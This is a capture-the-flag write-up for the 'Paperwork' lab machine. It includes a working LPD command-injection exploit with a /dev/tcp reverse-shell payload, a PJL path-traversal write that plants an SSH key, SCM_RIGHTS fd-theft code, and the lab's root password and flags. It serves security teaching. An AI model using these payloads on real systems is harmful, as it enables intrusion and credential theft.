# HTB — Paperwork

**Target IP:** `10.129.150.60`
**Hostname:** `paperwork.htb`
**Difficulty:** Medium (custom protocol exploitation chain)
**Attacker box:** Kali (WSL2, `DESKTOP-G17QB9R`)

## Summary

Paperwork is a Linux box built around a fictional "Document Archiving Service." The whole chain is driven by **three custom Python services** that reimplement legacy printing protocols (LPD and PJL/JetDirect) with no input sanitization:

| Stage | Vulnerability | Result |
|---|---|---|
| Foothold | Shell command injection in a custom LPD (line printer daemon) server | RCE as `lp` |
| Lateral move | Path traversal in a custom PJL/JetDirect filesystem handler | Arbitrary file write as `archivist` |
| Privilege escalation | `SCM_RIGHTS` file descriptor leak in a root-owned Unix socket daemon | Arbitrary file read as root → root password |

**Final chain:** LPD command injection (`lp`) → PJL path traversal file write to `authorized_keys` (`archivist`) → trigger root daemon's "malice" detector → root leaks an fd to a password file over `SCM_RIGHTS` → `su root`.

---

## 1. Reconnaissance

### 1.1 Initial port scan

```bash
nmap -sV -sC --reason 10.129.150.60
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu 5ubuntu5.4
80/tcp open  http    syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
```

Port 80 redirects to a vhost (`paperwork.htb`), so that gets added to `/etc/hosts`:

```bash
echo "10.129.150.60 paperwork.htb" | sudo tee -a /etc/hosts
```

### 1.2 Full TCP port scan

The initial top-1000 scan only shows 22 and 80. A full sweep reveals more:

```bash
nmap -p- --min-rate 5000 -sV -sC --reason 10.129.150.60 -oN full_tcp.txt
```

```
PORT     STATE SERVICE        REASON         VERSION
22/tcp   open  ssh            syn-ack ttl 63 OpenSSH 10.0p2 Ubuntu
80/tcp   open  http           syn-ack ttl 63 nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol? syn-ack ttl 63
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

Port **1515/tcp** is unrecognized by nmap but returns a banner-like string: `Archive_Printer is ready and printing.` — this is a strong hint at a custom print-related service (1515 is unusual for LPD, which normally runs on 515, but the behavior matches).

### 1.3 Web enumeration

```bash
whatweb http://paperwork.htb
curl -s -I http://paperwork.htb
curl -s http://paperwork.htb | tee index.html
```

Result: `whatweb` identifies the page title as **"Intranet | Document Archiving Service"**, served by `nginx/1.28.0`.

The homepage HTML contains a small "System Configuration" table with two very important clues:

```html
<td>Protocol</td>
<td><code>Compliance Level: RFC 1179</code></td>
...
<td>Target Queue</td>
<td><code>archive_intake</code></td>
...
<td>Internal Processor</td>
<td><a href="/download/archive"><code>paperwork-archive-v1.02</code></a></td>
```

- **RFC 1179** is the specification for the **Line Printer Daemon (LPD) protocol**.
- **`archive_intake`** is explicitly given as the valid print queue name.
- **`/download/archive`** offers a downloadable "processor" binary — this turns out to be gold.

```bash
curl -s http://paperwork.htb | grep -Eo 'src="[^"]+"|href="[^"]+"'
# href="/download/archive"
```

`robots.txt` and other common paths returned nothing (404):

```bash
curl -s http://paperwork.htb/robots.txt
curl -s http://paperwork.htb/download/
curl -s http://paperwork.htb/.well-known/
```

Directory brute force (`gobuster`) and vhost brute force (`ffuf`) were run but did not surface anything beyond what was already known — the real path forward was the downloadable file and port 1515.

---

## 2. Downloading and Identifying the "Archive Processor"

```bash
curl -s http://paperwork.htb/download/archive -o paperwork-archive-v1.02
file paperwork-archive-v1.02
```

```
paperwork-archive-v1.02: Zip archive data, made by v3.0 UNIX, extract using at least v2.0, ...
```

Despite being served without a `.zip` extension, it's a plain ZIP file. Unzipping it reveals the **full source code** of the print daemon that (as later confirmed) is running live on port 1515:

```bash
mkdir extracted && cd extracted
unzip ../paperwork-archive-v1.02
cat server.py
```

### 2.1 `server.py` — the custom LPD server

Cleaned-up/annotated version of the recovered source:

```python
import socket
import threading
import subprocess
import os

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):
    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            command = data[0]
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        if queue not in VALID_QUEUE:                      # substring check, not equality
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01')
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        self.sock.send(b'\x00')

        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            subcommand = chunk[0]
            self.sock.send(b'\x00')

            if subcommand == 2:  # Control File
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                decoded_content = content.decode(errors='ignore')

                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break

                print(f"{self.id} Executing archive for: {job_name}")
                # === VULNERABILITY ===
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                self.sock.send(b'\x00')

            elif subcommand == 3:  # Data File
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:
    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```

### 2.2 The vulnerability

This is a **loose implementation of RFC 1179 (LPD protocol)**:

1. Client sends `\x02<queue_name>\n` to open a print job on a queue.
2. Client sends a **control file** (subcommand `2`), whose lines describe job metadata. Any line starting with `J` is treated as the **job name**.
3. The server takes that raw, attacker-controlled job name and drops it directly into a shell command:

   ```python
   subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
   ```

Because `shell=True` is used and `job_name` is wrapped only in single quotes with no escaping, an attacker can simply **close the quote early** and inject arbitrary shell commands:

```
J x'; <attacker command>; echo 'x
```

Also note: `if queue not in VALID_QUEUE` is a substring containment check rather than equality — a minor secondary flaw, but irrelevant here since the queue name (`archive_intake`) was already handed to us on the homepage.

---

## 3. Foothold — Exploiting the LPD Command Injection

### 3.1 Exploit script

```python
#!/usr/bin/env python3
import socket

TARGET = "10.129.150.60"
PORT = 1515
QUEUE = "archive_intake"
LHOST = "10.10.16.24"   # attacker tun0 IP
LPORT = 4444

# Breaks out of the single-quoted echo command, runs a reverse shell,
# then re-opens a quote so the original command doesn't error out.
payload = f"x'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'; echo 'x"

control_file = f"Hpaperwork\nP0wned\nJ{payload}\n"
content = control_file.encode()
size = len(content)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

# Step 1: open the queue
s.send(b'\x02' + QUEUE.encode() + b'\n')
print("[+] Queue response:", s.recv(1024))

# Step 2: subcommand 2 (control file) + "<size> <filename>"
sub_chunk = bytes([0x02]) + f"{size} cfA001paperwork\n".encode()
s.send(sub_chunk)
print("[+] Subcommand ack:", s.recv(1024))

# Step 3: send the control file content containing the malicious job name
s.send(content)
print("[+] Final response:", s.recv(4096))

s.close()
```

### 3.2 Execution

Start a listener:

```bash
nc -lvnp 4444
```

Run the exploit:

```bash
python3 exploit.py
```

Result — shell caught as `lp`:

```
connect to [10.10.16.24] from (UNKNOWN) [10.129.150.60] 44052
bash: cannot set terminal process group (985): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$ whoami
lp
```

### 3.3 TTY stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
# press Enter twice
export TERM=xterm
stty rows 50 columns 200
```

---

## 4. Enumeration as `lp`

```bash
id
# uid=7(lp) gid=7(lp) groups=7(lp)

cat /etc/passwd | grep -E "sh$"
# root:x:0:0:root:/root:/bin/bash
# archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

`sudo` isn't even installed on the box, and no SUID binaries stand out (`passwd`, `su`, `mount`, standard set only). No crontabs of interest. The real leads come from hunting for anything related to "paperwork":

```bash
find / -iname "*paperwork*" 2>/dev/null
```

```
/sys/fs/cgroup/system.slice/paperwork.service
/run/paperwork
/var/spool/paperwork
/etc/nginx/sites-enabled/paperwork.htb
/etc/nginx/sites-available/paperwork.htb
/etc/tmpfiles.d/paperwork.conf
/etc/paperwork
/etc/systemd/system/multi-user.target.wants/paperwork.service
/etc/systemd/system/paperwork.service
/usr/bin/paperwork-daemon
```

And an internal-only listening port:

```bash
ss -tlnp
```

```
LISTEN 0 128   127.0.0.1:1337   0.0.0.0:*
LISTEN 0 100   0.0.0.0:1515     0.0.0.0:*   python3 (pid=985)   <- the LPD server we already exploited
LISTEN 0 100   127.0.0.1:9100   0.0.0.0:*                        <- JetDirect / raw printing port
```

Port **9100/tcp** is the standard port for the **HP JetDirect / AppSocket raw printing protocol**, and there's a matching systemd unit:

```bash
cat /etc/systemd/system/jetdirect.service
```

```ini
[Unit]
Description=jetdirect server
After=jetdirect.service
Requires=jetdirect.service

[Service]
Type=simple
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Key facts: this service **runs as `archivist`**, and its "filesystem root" is `/home/archivist/printer/`.

There's also a root-owned service:

```bash
cat /etc/systemd/system/paperwork.service
```

```ini
[Unit]
Description=Paperwork Management Daemon
After=network.target

[Service]
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
Restart=always
User=root
Group=root
```

`/usr/bin/paperwork-daemon` is readable and turns out to be a plaintext Python script:

```bash
cat /usr/bin/paperwork-daemon
```

```python
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        # === VULNERABILITY: leaks live root-owned file descriptors ===
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        zip_path = "/root/quarantine/evidence.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(LOG_PATH, arcname="commands.log")
        with open(LOG_PATH, 'w') as f:
            f.truncate(0)
        os.close(log_fd)
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    if os.path.exists(socket_path): os.remove(socket_path)
    if not os.path.exists("/run/paperwork"): os.makedirs("/run/paperwork")
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)   # owner root, group 1000 (archivist)
    s.listen(5)
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())
        conn.close()

if __name__ == "__main__":
    main()
```

**This is the key to root**, discovered early but not usable yet:

- The daemon opens `/etc/paperwork/admin_pins.conf` (mode `600`, owned by `root`) once at startup and keeps the fd (`admin_fd`) alive for the life of the process.
- It listens on a Unix domain socket `/run/paperwork/mgmt.sock`, owned `root:1000` (`archivist` group), mode `660` — so members of the `archivist` group can connect, but `lp` cannot.
- On every connection, if `commands.log` contains any of `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD` (case-insensitive), it treats the connection as a "security violation" and **sends the raw file descriptors for `commands.log` and `admin_pins.conf` to the connecting client via `SCM_RIGHTS`** ancillary data.
- Because file descriptors passed over `SCM_RIGHTS` carry the **opening process's** access rights, not the receiving process's, whoever receives this message can read `admin_pins.conf` **regardless of their own permissions** — using `os.pread(fd, ...)` directly on the received descriptor.

Confirmed permissions on the socket:

```bash
ls -la /run/paperwork/
# srw-rw---- 1 root archivist 0 ... mgmt.sock
```

`lp` is not in the `archivist` group, so this socket is unreachable for now — **we need to become `archivist` first.**

---

## 5. Lateral Movement — PJL Path Traversal to `archivist`

`/home/archivist/` is mode `750`, owned by `archivist:archivist`, so `lp` cannot read `jetdirect.py` directly from disk. Instead, we use the **live service on port 9100** to read its own source code, since it's a file server for its own working directory.

### 5.1 Talking to the PJL service (no `nc` on box → use Python3)

Basic identification:

```bash
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
s.send(b'\x1b%-12345X@PJL INFO ID\r\n\x1b%-12345X')
import time; time.sleep(1)
print(s.recv(4096))
s.close()
"
# b'HP LASERJET 4ML\r\n'
```

The `\x1b%-12345X` sequence is the standard **PJL Universal Exit Language (UEL)** escape used to enter/exit PJL mode on real printers — the custom server recognizes it.

Directory listing (`FSDIRLIST`):

```bash
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
s.send(b'\x1b%-12345X@PJL FSDIRLIST NAME=\"0:\\\\\" ENTRY=1 COUNT=999\r\n\x1b%-12345X')
time.sleep(1)
print(s.recv(8192))
s.close()
"
```

```
b'. TYPE=DIR\n.. TYPE=DIR\nlogs TYPE=DIR SIZE=4096\njetdirect.py TYPE=FILE SIZE=5119\r\n'
```

Reading the file content (`FSUPLOAD` — despite the name, this means "upload *to the client*", i.e. a file *read*):

```bash
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9100))
s.send(b'\x1b%-12345X@PJL FSUPLOAD NAME=\"0:\\\\jetdirect.py\" OFFSET=0 SIZE=10000\r\n\x1b%-12345X')
time.sleep(1)
print(s.recv(20000))
s.close()
"
```

This dumps the full `jetdirect.py` source (the JetDirect/PJL server implementation itself). Full annotated recovered source:

```python
#!/usr/bin/env python3
import os, sys, socket, logging, re, hashlib

class PJLServer:
    def __init__(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def listen(self, port=9100, backlog=100):
        self._server.bind(("127.0.0.1", port))
        self._server.listen(backlog)

    def accept(self):
        client, addr = self._server.accept()
        return PJLClient(client, addr[0])

class PJLClient:
    def __init__(self, client, address):
        self._client = client
        self._address = address

    def get_line(self):
        line = b""
        while True:
            char = self._client.recv(1)
            if not char: return None
            line += char
            if char == b"\n": break
        return line

    def reply(self, message):
        if isinstance(message, str):
            message = message.encode("utf-8")
        self._client.sendall(message)

    def close(self):
        self._client.close()

class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        # === VULNERABILITY: no traversal protection ===
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def listdir(self, name=""):
        target = self._translate(name)
        if not os.path.exists(target): return "FILEERROR=1"
        try:
            items = os.listdir(target)
            res = [". TYPE=DIR", ".. TYPE=DIR"]
            for i in items:
                p = os.path.join(target, i)
                res.append(f"{i} TYPE={'DIR' if os.path.isdir(p) else 'FILE'} SIZE={os.path.getsize(p)}")
            return "\n".join(res)
        except: return "FILEERROR=1"

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()
        return None

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"

fs = None

def handle_download(command, client):
    # FSDOWNLOAD == write a file TO the server (attacker-controlled content)
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)

def handle_upload(command):
    # FSUPLOAD == read a file FROM the server, send it to client
    m = re.search(r'NAME\s*=\s*"([^"]+)"', command, re.I)
    if not m: return "FILEERROR=1"
    path = m.group(1)
    data = fs.read(path)
    if data is None: return "FILEERROR=1"
    header = f'@PJL FSUPLOAD NAME="{path}" SIZE={len(data)}\n'.encode("utf-8")
    return header + data

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <PORT> <ROOT_DIR>")
        sys.exit(1)

    fs = Filesystem(sys.argv[2])
    LOG_FILE = "/home/archivist/printer/logs/commands.log"
    logging.basicConfig(level=logging.INFO, format="%(message)s",
        handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)])

    server = PJLServer()
    server.listen(int(sys.argv[1]))

    while True:
        client = server.accept()
        while True:
            line_bytes = client.get_line()
            if not line_bytes: break
            if b"@" not in line_bytes: continue
            line = line_bytes[line_bytes.find(b"@"):].decode("utf-8", errors="ignore").strip()
            if not line.startswith("@PJL"): continue
            logging.info(f"Command: {line}")

            if "FSDOWNLOAD" in line.upper():
                res = handle_download(line, client)
                client.reply(res + "\r\n")
            elif "FSUPLOAD" in line.upper():
                res = handle_upload(line)
                client.reply(res)
            elif "FSDIRLIST" in line.upper() or "FSQUERY" in line.upper():
                m = re.search(r'NAME\s*=\s*"([^"]+)"', line, re.I)
                res = fs.listdir(m.group(1) if m else "0:/")
                client.reply(res + "\r\n")
            elif "INFO ID" in line.upper():
                client.reply("HP LASERJET 4ML\r\n")
            elif "INFO FILESYS" in line.upper():
                client.reply("VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    <HT>     <HT>  READ-WRITE\r\n")
            elif "ECHO" in line.upper():
                client.reply(line + "\r\n")
            else:
                client.reply("OK\r\n")
        client.close()
```

### 5.2 The vulnerability

`Filesystem._translate()`:

```python
def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))
```

This strips the `0:` volume prefix and converts backslashes to forward slashes, but **never blocks `..` sequences**. `os.path.join` + `os.path.normpath` will happily resolve a path like:

```
0:../.ssh/authorized_keys
```

into:

```
/home/archivist/.ssh/authorized_keys
```

which is **outside** the intended root (`/home/archivist/printer/`).

Combined with `handle_download()` (the `FSDOWNLOAD` PJL command, which — despite the confusing naming from the printer's point of view — lets the *client* upload/write file content to the server), this is a **full arbitrary file write as the `archivist` user** (the uid the `jetdirect.service` runs as).

---

## 6. Exploiting the Traversal — Writing an SSH Key as `archivist`

### 6.1 Generate a keypair on the attacker box

```bash
ssh-keygen -t ed25519 -f archivist_key -N ""
cat archivist_key.pub
```

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDApHmUFLBo8fKdj1v59fXP8h71KaCnskxK9GxlQBous root@DESKTOP-G17QB9R
```

### 6.2 Write the public key into `archivist`'s `authorized_keys` via `FSDOWNLOAD`

Run **on the target**, as `lp` (talking to the local port 9100 service):

```python
python3 -c '
import socket, time

pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDApHmUFLBo8fKdj1v59fXP8h71KaCnskxK9GxlQBous root@DESKTOP-G17QB9R\n"
path = "0:../.ssh/authorized_keys"
size = len(pubkey)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
cmd = f"\x1b%-12345X@PJL FSDOWNLOAD NAME=\"{path}\" SIZE={size}\r\n".encode()
s.send(cmd + pubkey)
time.sleep(1)
print(s.recv(4096))
s.close()
'
```

```
b'OK\r\n'
```

Verify the write:

```python
python3 -c '
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X@PJL FSUPLOAD NAME=\"0:../.ssh/authorized_keys\"\r\n\x1b%-12345X")
time.sleep(1)
print(s.recv(4096))
s.close()
'
```

Returns our key back — confirmed written.

### 6.3 SSH in as `archivist`

```bash
chmod 600 archivist_key
ssh -i archivist_key archivist@10.129.150.60
```

```
archivist@paperwork:~$ id
uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
archivist@paperwork:~$ cat user.txt
63d64990328160fc33ea505ad45f339b
```

**User flag captured.**

---

## 7. Privilege Escalation — SCM_RIGHTS File Descriptor Leak

Now that we're `archivist` (member of group `1000`), the earlier obstacle is gone: `/run/paperwork/mgmt.sock` is `root:archivist` mode `660`, so `archivist` can connect to it.

### 7.1 The trigger condition was already met

Every PJL command we issued while exploiting the traversal (`FSQUERY`, `FSDIRLIST`, `FSUPLOAD`, `FSDOWNLOAD`) got appended to `/home/archivist/printer/logs/commands.log` by `jetdirect.py`'s logging setup. Confirmed:

```bash
cat /home/archivist/printer/logs/commands.log
```

```
...
Command: @PJL FSQUERY NAME="0:\..\..\..\home\archivist\printer\jetdirect.py"
Command: @PJL FSUPLOAD NAME="0:\..\..\..\home\archivist\.ssh\id_rsa" OFFSET=0 SIZE=4096
Command: @PJL FSDIRLIST NAME="0:\" ENTRY=1 COUNT=999
Command: @PJL FSQUERY NAME="0:\jetdirect.py"
Command: @PJL FSQUERY NAME="0:\logs\commands.log"
Command: @PJL FSUPLOAD NAME="0:\jetdirect.py" OFFSET=0 SIZE=10000
Command: @PJL FSDOWNLOAD NAME="0:../.ssh/authorized_keys" SIZE=102
Command: @PJL FSUPLOAD NAME="0:../.ssh/authorized_keys"
```

This log now contains `FSQUERY`, `FSUPLOAD`, and `FSDOWNLOAD` — exactly the trigger words `paperwork-daemon`'s `scan_for_malice()` checks for. So the **next** connection to `mgmt.sock` will cause the daemon to enter `trigger_lockdown()` and leak its file descriptors.

### 7.2 Connect and receive the leaked fds

```python
python3 -c '
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * 4))
print("Message:", msg)

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds = array.array("i")
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
        print("Received FDs:", list(fds))
        for fd in fds:
            try:
                data = os.pread(fd, 4096, 0)
                print(f"--- FD {fd} contents ---")
                print(data)
            except Exception as e:
                print(f"FD {fd} error:", e)
s.close()
'
```

Output:

```
Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
Received FDs: [4, 5]
--- FD 4 contents ---
b'... (commands.log contents) ...'
--- FD 5 contents ---
b'ADMIN_PASSWORD=ApparelMortuaryCedar22\n'
```

**Root's password recovered directly from a root-owned, `0600`-permissioned file — never actually reading it from disk, but by receiving a live copy of root's own open file descriptor over a Unix socket.**

### 7.3 Why this works

`SCM_RIGHTS` is a Unix domain socket ancillary-data mechanism that lets a process pass **open file descriptors** to another process. The receiving process gets a real, usable fd with the **same access rights the sender had when it opened the file** — file permission checks on the *path* are only evaluated once, at `open()` time, by the sending (root) process. Once passed, the receiver can read/write through that fd freely regardless of their own UID/GID, because the kernel's permission model for file descriptors is capability-based after the initial open. `paperwork-daemon`'s "forensic evidence" feature — intended to hand a SOC log + config fd to some trusted collector — instead hands it to whoever can simply get flagged as "malicious," making the anti-tampering feature itself the vulnerability.

---

## 8. Root

```bash
su root
Password: ApparelMortuaryCedar22
```

```
root@paperwork:/home/archivist# cat /root/root.txt
4b1e9f044b1eb0cd360b7a19dc6c67bc
```

**Root flag captured.**

---

## 9. Full Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────────────┐
│ 1. nmap full port scan → discover port 1515 (custom LPD) & 9100 (JetDirect, │
│    internal only)                                                          │
│                                                                             │
│ 2. Web page leaks: RFC1179 (LPD), queue name "archive_intake", and a       │
│    downloadable "processor" binary that turns out to be the LPD server's  │
│    own source code (server.py)                                            │
│                                                                             │
│ 3. server.py: unsanitized job_name → subprocess.Popen(shell=True)         │
│    ⇒ shell command injection over the LPD protocol on port 1515           │
│    ⇒ RCE as "lp"                                                          │
│                                                                             │
│ 4. Enumeration as lp reveals:                                             │
│      - paperwork-daemon (root, Unix socket, leaks fds on "malicious" logs)│
│      - jetdirect.py (archivist, port 9100, PJL-like protocol)             │
│                                                                             │
│ 5. Use port 9100 (still reachable as lp) to FSUPLOAD (read) jetdirect.py  │
│    source → find path traversal in Filesystem._translate()               │
│                                                                             │
│ 6. FSDOWNLOAD (write) with path "0:../.ssh/authorized_keys" → plant our   │
│    own SSH public key into /home/archivist/.ssh/authorized_keys          │
│    ⇒ SSH in as "archivist" → user.txt                                    │
│                                                                             │
│ 7. Our own FSQUERY/FSUPLOAD/FSDOWNLOAD commands got logged to             │
│    commands.log, satisfying paperwork-daemon's malice trigger             │
│                                                                             │
│ 8. Connect to /run/paperwork/mgmt.sock as archivist (now group-permitted) │
│    ⇒ daemon sends root-owned fds for commands.log + admin_pins.conf via  │
│      SCM_RIGHTS ⇒ os.pread() the fd directly, bypassing file perms       │
│                                                                             │
│ 9. Recovered ADMIN_PASSWORD → su root → root.txt                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Key Takeaways / Lessons

1. **Never build shell commands with untrusted, unsanitized input**, even with quoting — `subprocess.Popen(f"... {user_input} ...", shell=True)` is always injectable unless the input is strictly validated or `shell=False` with an argument list is used.
2. **Path traversal is still everywhere in home-grown "virtual filesystem" abstractions.** Any code that strips a prefix and joins it to a root directory must canonicalize the result and verify it is still inside the root (e.g., `os.path.commonpath` check, or `pathlib.Path.resolve()` + `is_relative_to()`), not just `lstrip("/")`.
3. **`SCM_RIGHTS` is dangerous to hand out conditionally based on attacker-influenceable state.** Here, the "security" feature (detect malicious PJL commands and quarantine evidence for a human) was flipped into an oracle: an attacker can deliberately trip the detector and receive the very file descriptors meant to be protected. Sensitive file descriptors should never be passed to a socket peer whose trust level hasn't been independently verified (e.g., via `SO_PEERCRED`).
4. **Defense in depth matters**: a well-intentioned anti-tampering/audit mechanism became the actual privilege escalation vector because it assumed "if malice is detected, hand full evidence to whoever triggered it" was safe.

---

## Flags

| Flag | Value |
|---|---|
| `user.txt` | `63d64990328160fc33ea505ad45f339b` |
| `root.txt` | `4b1e9f044b1eb0cd360b7a19dc6c67bc` |
